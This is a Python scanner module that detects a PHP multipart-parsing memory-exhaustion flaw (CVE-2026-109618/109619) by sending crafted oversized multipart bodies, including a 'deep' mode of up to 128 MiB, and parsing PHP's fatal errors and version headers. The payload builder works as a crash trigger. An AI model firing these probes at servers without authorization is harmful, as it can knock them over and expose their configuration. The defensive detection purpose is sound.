#!/usr/bin/env python3
"""Pure-Python php2shell detection (replaces the bundled nuclei template).

Ports the detection flow of the CVE-2026-109618 / CVE-2026-109619 template
that used to ship as php2shell.yaml:

  control   POST / with a tiny broken multipart; captures the HTTP status and
            the PHP version from X-Powered-By/Server.
  probes    for (MiB, parts) in [(1, 4000), (8, 1020), (20, 1020)]: POST a
            crafted multipart body whose field-name explosion blows past
            memory_limit; a match is the display_errors fatal
            ("Allowed memory size of ... bytes exhausted ... Unknown").
  verdict   with no crash match, fall back to the X-Powered-By version:
            VULNERABLE (below the fixed patch), FIXED, or EOL (< 8.2).

Request shapes are byte-compatible with the template (LF-separated
multipart framing, empty boundary), so results match nuclei's.
"""

import re
import sys
import urllib.parse

from exploit import Target, build_multipart

PROBES = [(1, 4000), (8, 1020), (20, 1020)]
# Escalating body sizes for deep probing (exploit verification): lets the
# OOM fatal appear on hosts with a higher memory_limit than the template's
# 20 MiB ceiling.
DEEP_PROBE_MIB = (24, 32, 40, 48, 64, 96, 128)
REJECTED = {400, 403, 411, 413, 414, 417, 422, 429, 431}

POWERED_BY_RE = re.compile(
    r"^(?:X-Powered-By|Server):[^\r\n]*\bPHP/(\d+\.\d+\.\d+[^\s;,)]*)",
    re.IGNORECASE | re.MULTILINE,
)
VERSION_RE = re.compile(
    r"^(?:X-Powered-By|Server):[^\r\n]*\bPHP/(\d+\.\d+\.\d+"
    r"(?:(?:[-+~_A-Za-z]|\.[A-Za-z])[0-9A-Za-z._+~-]*)?)(?:[ \t;,) \r]|$)",
    re.IGNORECASE | re.MULTILINE,
)

# "Allowed memory size of 8388608 bytes exhausted" -> memory_limit in bytes
MEMORY_LIMIT_RE = re.compile(r"Allowed memory size of (\d+) bytes exhausted")
# "Input variables exceeded 1000" -> max_input_vars
MAX_VARS_RE = re.compile(r"Input variables exceeded (\d+)")

# Result categories
MEMORY_EXHAUSTION = "memory-exhaustion"
VERSION_VULNERABLE = "version-vulnerable"
VERSION_EOL = "version-eol"
FIXED = "fixed"
UNKNOWN = "unknown"


def repeat_str(s, n):
    r = ""
    while n > 0:
        if n & 1:
            r += s
        s += s
        n >>= 1
    return r


def build_probe(size_mib, parts):
    """Craft the memory-exhaustion multipart body (byte-compatible port)."""
    size = size_mib * 1048576
    nested = repeat_str("[a]", 62)
    part = "--\nContent-Disposition:name=a[]" + nested + ";filename=\n\n"
    base = repeat_str(part, parts)
    filler_count = (size - len(base)) // 3
    filler = repeat_str("x:\n", filler_count)
    body = "--\n" + filler + base[3:]
    return body[: len(body) - 1]


def version_verdict(version):
    """Classify a PHP version string: VULNERABLE / FIXED / EOL / None."""
    if not version:
        return None
    m = re.match(r"^(\d+)\.(\d+)\.(\d+)(.*)$", version)
    if not m:
        return None
    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    if major < 8 or (major == 8 and minor < 2):
        return "EOL"
    fixed = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
    key = "%d.%d" % (major, minor)
    if key not in fixed:
        return None
    if patch < fixed[key]:
        return "VULNERABLE"
    if patch == fixed[key] and re.match(r"^[-_.]?(dev|alpha|beta|rc)",
                                        m.group(4), re.IGNORECASE):
        return "VULNERABLE"
    return "FIXED"


def _head_and_body(resp):
    head, _, body = resp.partition(b"\r\n\r\n")
    return head.decode("latin1"), body


def _parse_ini_facts(text, result):
    """Pull memory_limit / max_input_vars out of PHP's own error messages."""
    if result.get("memory_limit") is None:
        m = MEMORY_LIMIT_RE.search(text)
        if m:
            result["memory_limit"] = int(m.group(1))
    if result.get("max_input_vars") is None:
        m = MAX_VARS_RE.search(text)
        if m:
            result["max_input_vars"] = int(m.group(1))


def _status(head):
    m = re.match(r"HTTP/1\.[01] (\d{3})", head)
    return int(m.group(1)) if m else 0


def detect_max_vars(t, verbose=True):
    """Find the target's max_input_vars by escalating tiny-field requests.

    Each probe is cheap (1-byte field values); the warning text reveals the
    configured limit. Returns the limit, or 1000 (the PHP default) when no
    warning appears below 16001 fields.
    """
    for count in (1001, 2001, 4001, 8001, 16001):
        parts = [((b"f%05d" % i)[:6], b"x", None) for i in range(count)]
        body = build_multipart(parts, b"MV")
        resp = t.post_body(body, "multipart/form-data; boundary=MV",
                           read_cap=1 << 20)
        _, resp_body = _head_and_body(resp)
        text = resp_body.decode("latin1")
        m = MAX_VARS_RE.search(text)
        if m:
            return int(m.group(1))
    return 1000


def check_url(url, timeout=90.0, verbose=True, deep=False):
    """Run the detection flow against one URL.

    With deep=True (exploit verification), escalating body sizes are also
    probed so hosts with a memory_limit above the template's 20 MiB still
    show the OOM fatal.

    Returns a dict:
      result        MEMORY_EXHAUSTION | VERSION_VULNERABLE | VERSION_EOL |
                    FIXED | UNKNOWN
      version       detected PHP version or ""
      memory_limit  memory_limit in bytes parsed from the OOM fatal (or None)
      max_input_vars max_input_vars parsed from the warning (or None)
      url           the scanned URL
    """
    t = Target(url, timeout=timeout, verbose=verbose)
    result = {"result": UNKNOWN, "version": "", "url": url,
              "memory_limit": None, "max_input_vars": None}
    try:
        ctrl = t.post_body(
            b"--x\nContent-Disposition:name=a;filename=\n",
            "multipart/form-data; boundary=",
            read_cap=1 << 20,
        )
    except (OSError, ValueError) as exc:
        if verbose:
            print("[-] %s: %s" % (url, exc), file=sys.stderr)
        return result
    head, _ = _head_and_body(ctrl)
    ctrl_status = _status(head)
    if not ctrl_status or ctrl_status >= 500:
        return result

    powered_by = ""
    m = POWERED_BY_RE.search(head)
    if m:
        powered_by = m.group(1)

    matched = False
    for size_mib, parts in PROBES:
        body = build_probe(size_mib, parts).encode("latin1")
        resp = t.post_body(
            body,
            "multipart/form-data; boundary=",
            read_cap=1 << 20,
        )
        head, resp_body = _head_and_body(resp)
        m = POWERED_BY_RE.search(head)
        if m:
            powered_by = m.group(1)
        text = resp_body.decode("latin1")
        _parse_ini_facts(text, result)
        if ("Allowed memory size of" in text and "bytes exhausted" in text
                and "Unknown" in text):
            matched = True
            break
        status = _status(head)
        if status in REJECTED:
            break
        if version_verdict(powered_by) == "FIXED":
            break

    # Deep probing (exploit verification): hosts with a higher memory_limit
    # only show the OOM fatal for bodies larger than the template's 20 MiB.
    if not matched and deep:
        verdict_early = version_verdict(powered_by)
        if verdict_early in ("VULNERABLE", "EOL"):
            for size_mib in DEEP_PROBE_MIB:
                body = build_probe(size_mib, 1020).encode("latin1")
                resp = t.post_body(
                    body,
                    "multipart/form-data; boundary=",
                    read_cap=1 << 20,
                    timeout=timeout * 2,
                )
                head, resp_body = _head_and_body(resp)
                text = resp_body.decode("latin1")
                _parse_ini_facts(text, result)
                if ("Allowed memory size of" in text
                        and "bytes exhausted" in text and "Unknown" in text):
                    matched = True
                    break
                if _status(head) in REJECTED:
                    # post_max_size < memory_limit: this chain cannot OOM
                    # through the request body on this host.
                    break
    if matched and deep and result["max_input_vars"] is None:
        result["max_input_vars"] = detect_max_vars(t, verbose=verbose)

    vm = VERSION_RE.search(head) if not matched else None
    # Prefer a version seen in any response header (control or last probe).
    if not matched:
        vm = VERSION_RE.search(head)
    version = (vm.group(1) if vm else "") or powered_by
    verdict = version_verdict(version)
    if matched:
        # Both vulnerable and fixed builds print the OOM fatal (memory
        # exhaustion happens regardless); only the version tells the bug
        # (the OOM longjmp corruption) apart. A matched probe on a FIXED
        # version is therefore reported as fixed, not as a finding.
        if verdict == "FIXED":
            result["result"] = FIXED
        else:
            result["result"] = MEMORY_EXHAUSTION
        result["version"] = version
    elif verdict in ("VULNERABLE", "EOL"):
        result["result"] = VERSION_VULNERABLE if verdict == "VULNERABLE" \
            else VERSION_EOL
        result["version"] = version
    elif verdict == "FIXED":
        result["result"] = FIXED
        result["version"] = version
    return result


def finding_line(res):
    """One nuclei-style finding line, for terminal output and --log files."""
    tag = res["result"] if res["result"] != UNKNOWN else "no-detection"
    return ("[CVE-2026-109618:%s] [http] [critical] %s [\"%s\"]"
            % (tag, res["url"], res["version"] or "unknown"))


def is_vulnerable_url(url, timeout=90.0, verbose=True):
    """True only when the memory-exhaustion behavior was observed."""
    return check_url(url, timeout=timeout, verbose=verbose)[
        "result"] == MEMORY_EXHAUSTION
